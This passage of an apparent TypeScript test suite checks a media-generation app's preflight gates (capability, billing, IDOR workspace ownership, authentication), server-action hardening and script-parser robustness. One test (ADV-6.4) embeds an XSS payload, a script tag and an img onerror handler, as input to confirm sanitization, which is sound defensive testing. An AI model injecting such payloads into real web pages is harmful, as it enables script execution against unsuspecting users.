  // SECTION 4: 7-GATE PREFLIGHT BOUNDARY & FAIL-CLOSED GATES
  // ==========================================================================
  describe('4. 7-Gate Preflight Failure Boundary Stress Testing', () => {
    it('ADV-4.1: Gate 5 (Capability) fails closed when required multi-track capabilities are dynamically missing', async () => {
      const userId = 'usr_preflight_missing_caps';
      const workspaceId = 'ws_preflight_test';

      // Configure ONLY openrouter (which provides AI_TEXT only)
      await setUserApiKey(userId, 'openrouter', 'sk-or-test-key-001');

      // Request composite multi-track capabilities: AI_TEXT, AI_AUDIO, AI_IMAGE, AI_VIDEO
      const res = await runMissionPreflightCheck({
        userId,
        workspaceId,
        requiredCapabilities: ['AI_TEXT', 'AI_AUDIO', 'AI_IMAGE', 'AI_VIDEO'],
        overrides: {
          membershipVerified: true,
          storageReady: true,
          queueReady: true,
          mcuBalance: 100,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('CAPABILITY_NOT_SUPPORTED');
      expect(res.gates.capability.passed).toBe(false);
      expect(res.gates.capability.message).toContain('do not support required capabilities');

      const details = res.gates.capability.details as { missingCapabilities?: string[] };
      expect(details.missingCapabilities).toContain('AI_AUDIO');
      expect(details.missingCapabilities).toContain('AI_IMAGE');
      expect(details.missingCapabilities).toContain('AI_VIDEO');
      expect(details.missingCapabilities).not.toContain('AI_TEXT');
    });

    it('ADV-4.2: Gate 5 (Capability) passes when configured providers satisfy all required multi-track capabilities', async () => {
      const userId = 'usr_preflight_all_caps';
      const workspaceId = 'ws_preflight_test';

      // Configure openrouter (AI_TEXT), elevenlabs (AI_AUDIO), fal-ai (AI_IMAGE), replicate (AI_VIDEO)
      await setUserApiKey(userId, 'openrouter', 'sk-or-1');
      await setUserApiKey(userId, 'elevenlabs', 'sk-el-2');
      await setUserApiKey(userId, 'fal-ai', 'sk-fal-3');
      await setUserApiKey(userId, 'replicate', 'sk-rep-4');

      const res = await runMissionPreflightCheck({
        userId,
        workspaceId,
        requiredCapabilities: ['AI_TEXT', 'AI_AUDIO', 'AI_IMAGE', 'AI_VIDEO'],
        overrides: {
          membershipVerified: true,
          storageReady: true,
          queueReady: true,
          mcuBalance: 100,
        },
      });

      expect(res.passed).toBe(true);
      expect(res.gates.capability.passed).toBe(true);
      expect(res.gates.capability.code).toBe('CAPABILITY_OK');
    });

    it('ADV-4.3: Gate 3 (Entitlement) fails closed when MCU balance is 0 on non-MASTER tier', async () => {
      const userId = 'usr_zero_mcu';
      const res = await runMissionPreflightCheck({
        userId,
        workspaceId: userId,
        overrides: {
          mcuBalance: 0,
          tier: 'PRO',
          storageReady: true,
          queueReady: true,
          membershipVerified: true,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('INSUFFICIENT_ENTITLEMENT');
      expect(res.gates.entitlement.passed).toBe(false);
      expect(res.gates.entitlement.message).toContain('Insufficient MCU balance');
    });

    it('ADV-4.4: Gate 3 (Entitlement) fails closed when MCU balance is negative (-25)', async () => {
      const userId = 'usr_negative_mcu';
      const res = await runMissionPreflightCheck({
        userId,
        workspaceId: userId,
        overrides: {
          mcuBalance: -25,
          tier: 'BASIC',
          storageReady: true,
          queueReady: true,
          membershipVerified: true,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('INSUFFICIENT_ENTITLEMENT');
      expect(res.gates.entitlement.passed).toBe(false);
    });

    it('ADV-4.5: Gate 3 (Entitlement) permits execution on MASTER tier even with 0 MCU balance (unlimited tier policy)', async () => {
      const userId = 'usr_master_tier';
      await setUserApiKey(userId, 'fal-ai', 'fal_test_key');

      const res = await runMissionPreflightCheck({
        userId,
        workspaceId: userId,
        capability: 'AI_IMAGE',
        overrides: {
          mcuBalance: 0,
          tier: 'MASTER',
          storageReady: true,
          queueReady: true,
          membershipVerified: true,
        },
      });

      expect(res.gates.entitlement.passed).toBe(true);
      expect(res.gates.entitlement.code).toBe('ENTITLEMENT_OK');
    });

    it('ADV-4.6: Gate 3 (Spike Guard) fails closed with BILLING_FAILURE when estimated cost exceeds $5.00 limit', async () => {
      const userId = 'usr_spike_guard';
      const res = await runMissionPreflightCheck({
        userId,
        workspaceId: userId,
        estimatedCostCents: MAX_SINGLE_MISSION_COST_CENTS + 1, // 501 cents
        overrides: {
          mcuBalance: 500,
          tier: 'ENTERPRISE',
          storageReady: true,
          queueReady: true,
          membershipVerified: true,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('BILLING_FAILURE');
      expect(res.gates.entitlement.passed).toBe(false);
      expect(res.gates.entitlement.message).toContain('exceeds single mission limit');
    });

    it('ADV-4.7: Gate 2 (Ownership / IDOR) fails closed when user does not belong to target workspace in D1', async () => {
      const targetWorkspace = 'ws_confidential_bank';
      const outsiderUser = 'usr_attacker_99';

      // User does NOT exist in org_members for ws_confidential_bank
      const res = await runMissionPreflightCheck({
        userId: outsiderUser,
        workspaceId: targetWorkspace,
        overrides: {
          storageReady: true,
          queueReady: true,
          mcuBalance: 100,
        },
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('WORKSPACE_ACCESS_DENIED');
      expect(res.gates.ownership.passed).toBe(false);
    });

    it('ADV-4.8: Gate 1 (Auth) fails closed when no userId is passed and getCurrentUser returns null', async () => {
      const { getCurrentUser } = await import('@/seed/auth/better-auth-session');
      vi.mocked(getCurrentUser).mockResolvedValueOnce(null as unknown as typeof mockCurrentUser);

      const res = await runMissionPreflightCheck({
        workspaceId: 'ws_any',
      });

      expect(res.passed).toBe(false);
      expect(res.failureCode).toBe('NOT_AUTHENTICATED');
      expect(res.gates.auth.passed).toBe(false);
    });
  });

  // ==========================================================================
  // SECTION 5: LAND SERVER ACTION HARDENING (executeMultiTrackMissionAction)
  // ==========================================================================
  describe('5. Land Server Action Hardening (`executeMultiTrackMissionAction`)', () => {
    it('ADV-5.1: executeMultiTrackMissionAction returns failure Result on non-existent mission without throwing', async () => {
      const result = await executeMultiTrackMissionAction({
        missionId: 'msn_does_not_exist_xyz',
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.code).toBe('NOT_FOUND');
      }
    });

    it('ADV-5.2: executeMultiTrackMissionAction enforces IDOR workspace access check', async () => {
      const missionId = newMissionId();
      const victimWorkspace = 'ws_victim_company';

      // Insert mission belonging to ws_victim_company
      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status)
           VALUES (?, ?, 'usr_victim_owner', 'Confidential Launch', 'draft')`
        )
        .bind(missionId, victimWorkspace)
        .run();

      // Current user (usr_adversary_test) does NOT have membership in ws_victim_company
      const result = await executeMultiTrackMissionAction({
        missionId,
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.code).toBe('FORBIDDEN');
      }
    });

    it('ADV-5.3: executeMultiTrackMissionAction rejects execution when mission is in terminal completed state', async () => {
      const missionId = newMissionId();
      const workspaceId = 'ws_my_org';

      await activeD1
        .prepare(
          `INSERT INTO creative_missions (id, workspace_id, creator_id, title, status)
           VALUES (?, ?, ?, 'Already Completed Mission', 'completed')`
        )
        .bind(missionId, workspaceId, mockCurrentUser.id)
        .run();

      await activeD1
        .prepare(
          `INSERT INTO org_members (id, org_id, user_id, role)
           VALUES ('mem_1', ?, ?, 'OWNER')`
        )
        .bind(workspaceId, mockCurrentUser.id)
        .run();

      const result = await executeMultiTrackMissionAction({
        missionId,
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.code).toBe('EXECUTION_START_INVALID');
      }
    });

    it('ADV-5.4: executeMultiTrackMissionAction validates input schema (invalid aspectRatio rejected)', async () => {
      const result = await executeMultiTrackMissionAction({
        missionId: 'msn_valid_id',
        // Type casting invalid string to trigger runtime Zod schema validation
        aspectRatio: 'invalid-ratio' as unknown as '9:16',
      });

      expect(result.ok).toBe(false);
      if (!result.ok) {
        expect(result.error.code).toBe('VALIDATION_ERROR');
      }
    });
  });

  // ==========================================================================
  // SECTION 6: SCRIPT PARSER ADVERSARIAL CASES
  // ==========================================================================
  describe('6. Script Parser Adversarial Input Resilience', () => {
    it('ADV-6.1: Handles empty and pure whitespace rawContent gracefully without crashing', () => {
      const parsedEmpty = parseScriptIntoScenes('', 'Fallback Topic');
      expect(parsedEmpty.scenes.length).toBeGreaterThanOrEqual(1);
      expect(parsedEmpty.title).toBe('Fallback Topic');

      const parsedWhitespace = parseScriptIntoScenes('   \n\n\t   ', 'Whitespace Topic');
      expect(parsedWhitespace.scenes.length).toBeGreaterThanOrEqual(1);
    });

    it('ADV-6.2: Resilient against truncated or malformed JSON payloads', () => {
      const brokenJson = '{"title": "Unfinished Script", "scenes": [{"prompt": "Scene 1"';
      const parsed = parseScriptIntoScenes(brokenJson, 'Broken JSON Topic');
      expect(parsed.scenes.length).toBeGreaterThanOrEqual(1);
      expect(parsed.title).toBe('Broken JSON Topic');
    });

    it('ADV-6.3: Handles Unicode Vietnamese diacritics and special punctuation seamlessly', () => {
      const vietnameseScript = `
Scene 1:
Visual: Nhà sáng lập công nghệ làm việc tại bàn làm việc hiện đại với màn hình ba chiều
Narration: Đây là lý do tại sao tự động hóa AI sẽ thay đổi mọi thứ vào năm 2026.

Scene 2:
Visual: Dây chuyền sản xuất video tự động kết xuất dữ liệu ở tốc độ ánh sáng
Narration: Xem cách các tác tử xây dựng sản phẩm và đột phá doanh thu.
`;
      const parsed = parseScriptIntoScenes(vietnameseScript, 'Tự động hóa AI 2026');
      expect(parsed.scenes.length).toBe(2);
      expect(parsed.scenes[0].prompt).toContain('Nhà sáng lập công nghệ');
      expect(parsed.scenes[1].narration).toContain('Xem cách các tác tử');
      expect(parsed.wordCount).toBeGreaterThan(15);
    });

    it('ADV-6.4: Sanitizes HTML / XSS payloads embedded inside script scenes', () => {
      const xssScript = `
Scene 1:
Visual: <script>alert("xss")</script><img src=x onerror=alert(1)>
Narration: Normal narration text
`;
      const parsed = parseScriptIntoScenes(xssScript, 'XSS Test');
      expect(parsed.scenes.length).toBe(1);
      expect(parsed.scenes[0].prompt).toBeTruthy();
      expect(parsed.scenes[0].narration).toBe('Normal narration text');
    });
  });
});
